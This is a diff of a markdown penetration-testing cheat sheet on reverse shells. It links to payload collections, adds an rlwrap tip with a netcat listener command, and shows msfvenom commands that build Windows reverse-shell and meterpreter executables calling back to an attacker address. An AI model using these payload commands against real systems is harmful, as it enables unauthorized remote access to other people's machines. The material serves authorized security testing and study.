@@ -6,9 +6,19 @@ This is s great collection of different types of reverse shells and webshells. M
 [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 _[UPDATE-07-2019]_ **Huge number of different shells/webshells/payloads:**
+* [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
 
-[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
+## Shell improvements
 
+This should be at the bottom, but that way would've been easilly missed, so i've placed it on top. The reason is that it had helped me a lot of times to have more features using shells.
+
+### rlwrap
+
+It'll add up/down arrow functionality to a shell. Very simple for usage, just place it infront of the shell command and suddenly you can browse through the commands history with up/down arrows.
+
+```
+rlwrap nc 192.168.0.45 1234
+```
 
 ## Msfvenom
 
@@ -42,7 +52,7 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.101 LPORT=443 -f e
 #### Non-staged payload
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f exe -o shell_reverse_tcp.exe   
 ```
 
 ```
